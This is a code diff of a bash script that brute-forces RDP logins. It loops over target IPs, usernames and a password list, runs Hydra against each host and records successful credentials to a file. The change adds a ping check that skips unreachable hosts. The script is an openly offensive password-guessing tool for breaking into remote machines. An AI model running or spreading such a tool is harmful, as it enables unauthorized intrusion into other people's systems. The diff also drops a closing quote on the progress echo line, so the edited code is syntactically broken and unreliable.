@@ -4,7 +4,7 @@
 iplog_file="iplog.txt"
 passwords_file="passwords.txt"
 success_log_file="successful_logins.txt"
-error_log_file="error_log.txt"
+error_log_file="error_log_file.txt"
 
 # Check if the input files exist
 if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
@@ -47,7 +47,7 @@ display_progress() {
     echo "Current Speed: $attempts_per_minute attempts/minute"
 
     if (( current_attempt > 0 )); then
-        echo "Estimated Time Left: $(printf '%02d:%02d:%02d' $((estimated_time_left/3600)) $(( (estimated_time_left%3600)/60 )) $((estimated_time_left%60)))"
+        echo "Estimated Time Left: $(printf '%02d:%02d:%02d' $((estimated_time_left/3600)) $(( (estimated_time_left%3600)/60 )) $((estimated_time_left%60)))
     fi
 }
 
@@ -70,22 +70,27 @@ for password in "${passwords[@]}"; do
         # Check if the rdp_ip and target_name are not empty
         if [[ -z "$rdp_ip" || -z "$target_name" ]]; then continue; fi
 
-        # Run Hydra for each username and password pair, capturing output
-        if sudo hydra -l "$target_name" -p "$password" "$rdp_ip" -t 5 -W 4 | grep -q "login successful"; then
-            echo "Successful login with $target_name on $rdp_ip using password: $password" >> "$success_log_file"
-            successful_attempts=$((successful_attempts + 1))
-        else
-            echo "Failed login attempt for $target_name on $rdp_ip using password: $password" >> "$error_log_file"
-        fi
-        
-        # Update current attempt count
-        current_attempt=$((current_attempt + 1))
-        
-        # Update elapsed time
-        elapsed_time=$(( $(date +%s) - start_time ))
+        # Check if the host is alive (using ping)
+        if ping -c 1 -W 1 "$rdp_ip" &> /dev/null; then
+            # Run Hydra for each username and password pair, capturing output
+            if sudo hydra -l "$target_name" -p "$password" "$rdp_ip" -t 5 -W 4 | grep -q "login successful"; then
+                echo "Successful login with $target_name on $rdp_ip using password: $password" >> "$success_log_file"
+                successful_attempts=$((successful_attempts + 1))
+            else
+                echo "Failed login attempt for $target_name on $rdp_ip using password: $password" >> "$error_log_file"
+            fi
+            
+            # Update current attempt count
+            current_attempt=$((current_attempt + 1))
+            
+            # Update elapsed time
+            elapsed_time=$(( $(date +%s) - start_time ))
 
-        # Display progress
-        display_progress "$elapsed_time" "$current_attempt" "$successful_attempts" "$password"
+            # Display progress
+            display_progress "$elapsed_time" "$current_attempt" "$successful_attempts" "$password"
+        else
+            echo "Host $rdp_ip is not reachable, skipping..." >> "$error_log_file"
+        fi
     done
 
     # Remove the password from passwords.txt by creating a new file without the used password
